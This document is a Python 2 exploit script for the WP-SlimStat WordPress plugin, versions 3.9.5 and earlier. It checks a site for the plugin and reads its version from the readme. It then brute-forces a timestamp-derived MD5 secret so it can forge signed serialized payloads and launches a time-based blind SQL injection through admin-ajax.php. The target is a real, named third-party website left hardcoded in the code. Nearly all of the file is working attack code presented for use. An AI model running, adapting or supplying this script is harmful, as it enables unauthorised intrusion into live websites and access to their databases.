# Written by Joren485

import time
import hashlib
import base64
import requests
import re
import sys
import operator
import json


def bruteforce_timestamp(ci):
    """Bruteforce the epoch timestamp given the signed ci data."""
    
    signed, nonce = ci.split(".")

    begin = int(time.mktime(time.strptime('30.12.2010 00:00:00', '%d.%m.%Y %H:%M:%S')))
    end = int(time.mktime(time.strptime('28.02.2015 00:00:00', '%d.%m.%Y %H:%M:%S')))
    time_range = end - begin + 1

    progress_list = range(101)

    for epoch in xrange(time_range):

        epoch += begin

        # Very primitive progress bar
        progress = round((float(epoch - begin)/time_range)*100, 6)
        if progress % 1 == 0 and progress in progress_list:
            print "\t{0}% - {1}".format(progress, epoch)
            progress_list.remove(int(progress))

        # Check if the epoch is the good value 
        secret = hashlib.md5(str(epoch)).hexdigest()
        if nonce == hashlib.md5(signed+secret).hexdigest():
            print "[+]Found the secret: {0} - {1}".format(secret, epoch)
            return secret

        if epoch == time_range - 1:
            return False

def encode_data(injection_string, secret):

    array_payload = 'a:1:{{s:{0}:"{1}";s:1:"1";}}'.format(len(injection_string), injection_string)
    array_payload64 = base64.b64encode(array_payload)
    signature = hashlib.md5(array_payload64+secret).hexdigest()
    
    ci = "{0}.{1}".format(array_payload64, signature) 
    return base64.b64encode("ci={0}&res=Lw==".format(ci))


def sqli_request(session, url, injection_string, secret, timeout):
    """Perform a sql injection request."""

    data_to_send = encode_data(injection_string, secret)

    try:
        session.post(url,
                     data={"action": "slimtrack_js",
                           "data": data_to_send},
                     timeout=timeout)

    except requests.exceptions.Timeout:
        return True

    except requests.exceptions.RequestException:
        return False

    return False 


def fingerprint(session, url):
    """"Check if a website is vulnerable."""

    # Get /wp-content/plugins/wp-slimstat/ to see if the plugin is installed
    try:
        r_plugin = session.head(url + "/wp-content/plugins/wp-slimstat/")
        
    except requests.exceptions.RequestException:
        return False

    # If the status_code != 200 or 403, the folder doesnt exist
    if not r_plugin.ok and r_plugin.status_code != 403:
        return False

    # Get the SlimStateParams from the homepage
    try:
        r_homepage = session.get(url)
        
    except requests.exceptions.RequestException:
        return False

    match = re.search("var SlimStatParams = ({.*});", r_homepage.text)
    if match:
        print "[+]Found SlimStatParams"

        # Parse the SlimStatParams
        SlimStatParams = json.loads(match.group(1))

        # Check for ajaxurl
        if "ajaxurl" in SlimStatParams.keys():
            ajaxurl = SlimStatParams["ajaxurl"]

        else:
            ajaxurl = "{0}/wp-admin/admin-ajax.php".format(url)

        # Check for ci/id if not found return 
        if "ci" in SlimStatParams.keys():
            ci = SlimStatParams["ci"]

        elif "id" in SlimStatParams.keys():
            ci = SlimStatParams["id"]
            
        else:
            print "[-]CI/ID not found"
            return False
        
    else:
        print "[-]SlimStatParams not found!"
        return False

    # Retrieve the readme file for the wp-slimstat plugin
    try:
        r_readme = session.get(url + "/wp-content/plugins/wp-slimstat/readme.txt")

    except requests.exceptions.RequestException:
        return False

    # Only if the readme file exists
    if r_readme.ok:
        print "[+]Readme found!"

        # Find the version in the readme file
        match = re.search(r"Stable tag: ([\d\.]{1,5})", r_readme.text)
        if match:
            
            print "[+]Version found: {0}".format(match.group(1))

            version_list = map(int, match.group(1).split("."))
            version_list += [0] * (3 - len(version_list))

            # Check wheter the version is lower than 3.9.6
            sub = map(operator.sub, [3, 9, 5], version_list)

            if sorted(sub)[0] < 0:
                print "[-]Version > 3.9.5"
                return False 

        else:
            print "[-]Version not found!"
            return False
    else:
        print "[-]Readme not found!"
        return False

    return ci, ajaxurl


# I left the vulnerable url in because it is (very!!!) easy to find.
url = "http://jafs.es/"
timeout = 5

# This simple query is used to check if a site is vulnerable
query = "(SELECT IF('a' = 'a', sleep({timeout_placeholder}), 0) LIMIT 1)".format(timeout_placeholder=timeout)

print "[+]Attacking {0}".format(url)

# Create an session, with the appropriate user-agent
s = requests.Session()
s.headers={"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0"}
 
SlimStatParams = fingerprint(s, url)
if SlimStatParams:
    ci, ajaxurl = SlimStatParams
    secret = bruteforce_timestamp(ci)
    if secret:
        print "[+]Found secret: {0}".format(secret)
        
        # With the right epoch (and thus the right secret) found, start the blind SQL injection
        print "[+]Check for sql injection"
        if sqli_request(s, ajaxurl, query, secret, timeout):
            print "[+]Vulnerable"
